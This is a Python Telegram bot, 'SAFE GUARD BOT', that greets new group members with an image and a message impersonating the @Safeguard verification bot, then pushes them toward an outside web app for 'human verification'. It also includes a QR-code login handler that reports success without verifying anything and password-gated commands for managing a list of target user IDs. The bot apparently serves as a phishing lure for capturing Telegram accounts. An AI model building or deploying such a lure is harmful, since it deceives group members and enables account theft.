import os
import logging
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup 
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler, ConversationHandler
from telegram.constants import ParseMode
from config import *
from utils.user_id_manager import UserIDManager

# Conversation states for admin commands
WAITING_FOR_PASSWORD = 1
WAITING_FOR_USER_ID = 2

# Configure logging
logging.basicConfig(
    format=LOG_FORMAT,
    level=getattr(logging, LOG_LEVEL)
)
logger = logging.getLogger(__name__)

class TelegramBot:
    def __init__(self, token: str = None):
        self.token = token or BOT_TOKEN
        self.bot_username = BOT_USERNAME
        self.app = Application.builder().token(self.token).build()
        self.user_id_manager = UserIDManager()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup all bot handlers"""
        # Handle /start command
        self.app.add_handler(CommandHandler("start", self.start_command))
        
        # Handle admin commands with conversation handlers
        self.app.add_handler(ConversationHandler(
            entry_points=[
                CommandHandler("add_userId", self.add_user_id_command),
                CommandHandler("del_userId", self.delete_user_id_command),
                CommandHandler("userId", self.list_user_ids_command)
            ],
            states={
                WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_password)],
                WAITING_FOR_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_user_id_input)]
            },
            fallbacks=[CommandHandler("cancel", self.cancel_command)]
        ))
        
        # Handle help command
        self.app.add_handler(CommandHandler("help", self.help_command))
        
        # Handle new chat members (when users join groups)
        self.app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, self.handle_new_member))
        
        # Handle callback queries (button clicks)
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # Handle regular messages
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Add a catch-all handler for debugging
        self.app.add_handler(MessageHandler(filters.ALL, self.debug_handler))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        message_text = update.message.text
        
        # Check if this is a QR code login
        if message_text.startswith('/start qr_'):
            qr_session_id = message_text.split('qr_')[1]
            await self.handle_qr_login(update, context, qr_session_id)
            return
        
        welcome_text = START_MESSAGE.format(user_name=user.first_name)
        
        keyboard = [
            [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def handle_qr_login(self, update: Update, context: ContextTypes.DEFAULT_TYPE, qr_session_id: str):
        """Handle QR code login"""
        user = update.effective_user
        
        # Verify the QR session (in real implementation, this would check against your web app)
        success_text = f"✅ QR Code verified successfully!\n\nWelcome {user.first_name} to SAFE GUARD BOT!"
        
        await update.message.reply_text(
            success_text,
            parse_mode=ParseMode.HTML
        )
        
        # Log the QR login
        logger.info(f"QR login successful for user {user.id} with session {qr_session_id}")

    async def handle_new_member(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle when new users join a group"""
        chat = update.effective_chat
        logger.info(f"🆕 New member event detected in chat: {chat.id} ({chat.title})")
        new_members = update.message.new_chat_members
        logger.info(f"👥 New members: {[f'{m.first_name} (ID: {m.id}, Bot: {m.is_bot})' for m in new_members]}")
        for new_member in new_members:
            if not new_member.is_bot:
                logger.info(f"👤 Processing new human member: {new_member.first_name} (ID: {new_member.id})")
                logger.info(f"📝 Message ID: {update.message.message_id}")
                logger.info(f"📝 Chat Type: {chat.type}")
                logger.info(f"📝 Chat Title: {chat.title}")
                # 1. Send the Safeguard Human Verification image
                try:
                    photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
                    await update.message.reply_photo(photo=photo_url)
                        
                except Exception as e:
                    logger.error(f"❌ Failed to send verification image: {e}")
                # 2. Send the styled welcome message
                welcome_text = (
                    'This group is being protected by '
                    '<a href="https://t.me/safeguard_bot">@Safeguard</a>.'
                    '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
                ).format(webapp_url=WEBAPP_URL)
                keyboard = [
                    [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                try:
                    await update.message.reply_text(
                        welcome_text,
                        reply_markup=reply_markup,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                    logger.info(f"✅ Welcome message sent for new member {new_member.id} in chat {chat.id}")
                except Exception as e:
                    logger.error(f"❌ Failed to send welcome message: {e}")
            else:
                logger.info(f"🤖 Skipping bot member: {new_member.first_name}")

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callback queries"""
        query = update.callback_query
        await query.answer()
        
        # Handle different callback data here
        if query.data == "verify":
            await query.edit_message_text("🔐 Please click the verification link to proceed.")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle regular text messages"""
        user = update.effective_user
        message_text = update.message.text
        
        # You can add custom message handling logic here
        if "verify" in message_text.lower():
            keyboard = [
                [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "🔐 Please verify your account to proceed.",
                reply_markup=reply_markup
            )
    
    async def debug_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Debug handler to catch all messages"""
        logger.info(f"🔍 DEBUG: Received message in chat {update.effective_chat.id}")
        logger.info(f"🔍 DEBUG: Message type: {type(update.message).__name__}")
        logger.info(f"🔍 DEBUG: Message content: {list(update.message.__dict__.keys())}")
        
        # Check if this is a new member message
        if hasattr(update.message, 'new_chat_members') and update.message.new_chat_members:
            logger.info(f"🔍 DEBUG: New chat members detected: {len(update.message.new_chat_members)}")
            for member in update.message.new_chat_members:
                logger.info(f"🔍 DEBUG: Member: {member.first_name} (Bot: {member.is_bot})")
    
    # Admin Commands
    async def add_user_id_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /add_userId command"""
        user = update.effective_user
        if str(user.id) != str(SCRIPT_TARGET_USER_ID):
            await update.message.reply_text(
                "❌ <b>Access Denied</b>\n\nYou are not authorized to add user IDs.",
                parse_mode=ParseMode.HTML
            )
            return ConversationHandler.END
        logger.info(f"🔐 Admin command /add_userId requested by user {user.id} ({user.first_name})")
        
        await update.message.reply_text(
            "🔐 <b>Admin Authentication Required</b>\n\n"
            "Please enter the admin password:",
            parse_mode=ParseMode.HTML
        )
        
        # Store the command type in context
        context.user_data['admin_command'] = 'add_user_id'
        
        return WAITING_FOR_PASSWORD
    
    async def delete_user_id_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /del_userId command"""
        user = update.effective_user
        if str(user.id) != str(SCRIPT_TARGET_USER_ID):
            await update.message.reply_text(
                "❌ <b>Access Denied</b>\n\nYou are not authorized to delete user IDs.",
                parse_mode=ParseMode.HTML
            )
            return ConversationHandler.END
        logger.info(f"🔐 Admin command /del_userId requested by user {user.id} ({user.first_name})")
        
        await update.message.reply_text(
            "🔐 <b>Admin Authentication Required</b>\n\n"
            "Please enter the admin password:",
            parse_mode=ParseMode.HTML
        )
        
        # Store the command type in context
        context.user_data['admin_command'] = 'delete_user_id'
        
        return WAITING_FOR_PASSWORD
    
    async def list_user_ids_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /userId command"""
        user = update.effective_user
        logger.info(f"🔐 Admin command /userId requested by user {user.id} ({user.first_name})")
        
        await update.message.reply_text(
            "🔐 <b>Admin Authentication Required</b>\n\n"
            "Please enter the admin password:",
            parse_mode=ParseMode.HTML
        )
        
        # Store the command type in context
        context.user_data['admin_command'] = 'list_user_ids'
        
        return WAITING_FOR_PASSWORD
    
    async def handle_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle password input for admin commands"""
        user = update.effective_user
        password = update.message.text.strip()
        command_type = context.user_data.get('admin_command')
        
        logger.info(f"🔐 Password verification for user {user.id} ({user.first_name}) for command: {command_type}")
        
        # Check if password matches
        if password != ADMIN_PASSWORD:
            logger.warning(f"❌ Invalid admin password attempt by user {user.id}")
            await update.message.reply_text(
                "❌ <b>Access Denied</b>\n\n"
                "Invalid admin password. Please try again or use /cancel to abort.",
                parse_mode=ParseMode.HTML
            )
            return WAITING_FOR_PASSWORD
        
        logger.info(f"✅ Admin password verified for user {user.id}")
        
        # Handle different command types
        if command_type == 'list_user_ids':
            return await self.show_user_ids(update, context)
        elif command_type in ['add_user_id', 'delete_user_id']:
            return await self.request_user_id_input(update, context, command_type)
        else:
            await update.message.reply_text("❌ Unknown command type")
            return ConversationHandler.END
    
    async def show_user_ids(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show the list of user IDs"""
        user_ids = self.user_id_manager.get_user_ids()
        count = len(user_ids)
        
        if count == 0:
            message = "📋 <b>User IDs List</b>\n\nNo user IDs found."
        else:
            message = f"📋 <b>User IDs List</b>\n\nTotal: {count} user ID(s)\n\n"
            # Display user IDs in chunks of 10 for readability
            for i in range(0, count, 10):
                chunk = user_ids[i:i+10]
                message += "\n".join(chunk) + "\n"
                if i + 10 < count:
                    message += "\n"
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.HTML
        )
        
        # Clear context data
        context.user_data.clear()
        return ConversationHandler.END
    
    async def request_user_id_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, command_type: str):
        """Request user ID input for add/delete operations"""
        action = "add" if command_type == 'add_user_id' else "delete"
        
        await update.message.reply_text(
            f"📝 <b>Input User ID</b>\n\n"
            f"Please enter the user ID you want to {action}:",
            parse_mode=ParseMode.HTML
        )
        
        # Store the command type for the next step
        context.user_data['admin_command'] = command_type
        
        return WAITING_FOR_USER_ID
    
    async def handle_user_id_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user ID input for add/delete operations"""
        user = update.effective_user
        user_id_input = update.message.text.strip()
        command_type = context.user_data.get('admin_command')
        
        logger.info(f"📝 User ID input received: {user_id_input} for command: {command_type}")
        
        if command_type == 'add_user_id':
            success = self.user_id_manager.add_user_id(user_id_input)
            if success:
                await update.message.reply_text(
                    f"✅ <b>Success!</b>\n\n"
                    f"User ID <code>{user_id_input}</code> has been added to the list.",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ <b>Failed to add user ID</b>\n\n"
                    f"User ID <code>{user_id_input}</code> could not be added. "
                    f"It might already exist or be invalid.",
                    parse_mode=ParseMode.HTML
                )
        
        elif command_type == 'delete_user_id':
            success = self.user_id_manager.delete_user_id(user_id_input)
            if success:
                await update.message.reply_text(
                    f"✅ <b>Success!</b>\n\n"
                    f"User ID <code>{user_id_input}</code> has been deleted from the list.",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ <b>Failed to delete user ID</b>\n\n"
                    f"User ID <code>{user_id_input}</code> was not found in the list.",
                    parse_mode=ParseMode.HTML
                )
        
        # Clear context data
        context.user_data.clear()
        return ConversationHandler.END
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel the current conversation"""
        user = update.effective_user
        logger.info(f"🚫 Admin command cancelled by user {user.id}")
        
        await update.message.reply_text(
            "🚫 <b>Operation Cancelled</b>\n\n"
            "The admin operation has been cancelled.",
            parse_mode=ParseMode.HTML
        )
        
        # Clear context data
        context.user_data.clear()
        return ConversationHandler.END
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        user = update.effective_user
        logger.info(f"📋 Help command requested by user {user.id}")
        
        help_text = (
            "🤖 <b>SAFE GUARD BOT - Available Commands</b>\n\n"
            "📋 <b>General Commands:</b>\n"
            "• /start - Start the bot and get welcome message\n"
            "• /help - Show this help message\n\n"
            "🔐 <b>Admin Commands (Password Required):</b>\n"
            "• /add_userId - Add a user ID to the verification list\n"
            "• /del_userId - Delete a user ID from the verification list\n"
            "• /userId - List all user IDs in the verification list\n"
            "• /cancel - Cancel current admin operation\n\n"
            "🔄 <b>Automatic Triggers:</b>\n"
            "• New member joins a group\n"
            "• Someone types 'verify' in chat\n\n"
            "💡 <b>Note:</b> Admin commands require authentication and proper authorization."
        )
        
        await update.message.reply_text(
            help_text,
            parse_mode=ParseMode.HTML
        )
    
    async def send_verification_message(self, chat_id: int, user_name: str = None):
        """Send verification message to a specific chat"""
        text = VERIFICATION_MESSAGE.format(bot_username=self.bot_username)
        
        keyboard = [
            [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await self.app.bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            return True
        except Exception as e:
            logger.error(f"Failed to send verification message to {chat_id}: {e}")
            return False
    
    def run(self):
        """Start the bot"""
        logger.info("🤖 Starting Safeguard Bot...")
        logger.info(f"🔑 Bot Token: {self.token[:10]}...")
        logger.info(f"👤 Bot Username: @{self.bot_username}")
        logger.info(f"🌐 Web App URL: {WEBAPP_URL}")
        logger.info("📡 Bot is now polling for updates...")
        logger.info("💡 Make sure the bot is added to groups with proper permissions")
        logger.info("🔧 Run fix_bot_permissions.py to diagnose permission issues")
        
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.error("💡 Common solutions:")
            logger.error("   1. Check if bot token is valid")
            logger.error("   2. Ensure bot is added to groups")
            logger.error("   3. Verify bot has proper permissions")
            raise

def main():
    """Main function to run the bot"""
    # Create and run the bot
    bot = TelegramBot()
    bot.run()

if __name__ == "__main__":
    main() 